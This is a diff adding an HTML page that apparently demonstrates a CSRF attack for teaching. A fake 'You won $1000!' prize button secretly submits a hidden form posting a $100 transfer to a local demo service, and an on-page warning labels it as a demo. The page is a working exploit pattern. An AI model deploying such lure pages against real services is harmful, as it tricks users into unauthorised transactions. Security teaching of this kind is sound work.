@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 Free Gift!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            color: white;
+            padding: 50px;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            padding: 40px;
+            border-radius: 15px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .big-button {
+            background: #ff4757;
+            color: white;
+            padding: 20px 40px;
+            border: none;
+            border-radius: 25px;
+            font-size: 20px;
+            cursor: pointer;
+            margin: 20px;
+        }
+        .warning {
+            background: rgba(255,255,0,0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Congratulations!</h1>
+        <h2>You won $1000!</h2>
+        <p>Click to claim your prize!</p>
+        
+        <button class="big-button" onclick="attack()">Claim Prize! 🎁</button>
+        
+        <div class="warning">
+            <strong>⚠️ DEMO WARNING ⚠️</strong><br>
+            This demonstrates a CSRF attack!<br>
+            The hidden form below will transfer $100 from your account.
+        </div>
+        
+        <!-- CSRF Attack Form (Hidden) -->
+        <form id="csrf-form" class="hidden" method="POST" action="http://localhost:5001/transfer">
+            <input type="hidden" name="recipient" value="user">
+            <input type="hidden" name="amount" value="100">
+        </form>
+        
+        <div id="result" class="hidden">
+            <h3>🚨 CSRF Attack Executed!</h3>
+            <p>$100 was transferred without your permission!</p>
+        </div>
+    </div>
+
+    <script>
+        function attack() {
+            // Submit the hidden form
+            document.getElementById('csrf-form').submit();
+            
+            // Show result
+            document.getElementById('result').classList.remove('hidden');
+            
+            // Update button
+            const button = document.querySelector('.big-button');
+            button.innerHTML = '💀 Attack Complete!';
+            button.disabled = true;
+            button.style.background = '#666';
+        }
+    </script>
+</body>
+</html>
